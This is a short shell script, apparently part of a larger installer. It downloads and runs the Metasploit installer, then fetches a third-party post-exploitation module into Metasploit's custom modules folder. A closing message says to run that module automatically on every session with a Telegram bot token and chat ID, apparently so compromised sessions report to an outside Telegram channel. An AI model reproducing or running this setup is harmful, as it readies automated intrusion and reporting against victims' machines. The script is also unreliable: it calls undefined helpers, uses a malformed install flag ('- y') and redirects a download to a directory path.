INSTALL='yum'
if [ $(test_cmd $INSTALL) -eq 0 ];then
    $INSTALL install - y curl;
else
    apt-get install -y curl;
fi
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

cd /opt/metasploit-framework/
if [ -d embedded ];then
  cd embedded;
fi

if [ -d framework/modules/post ];then
  mkdir framework/modules/post/custom/ && curl https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/tel.rb > framework/modules/post/custom/ ;
  gglog "Install good| use by 'set AUTORUNSCRIPT post/custom/tel token=xxx chat_id=@xxx"
fi
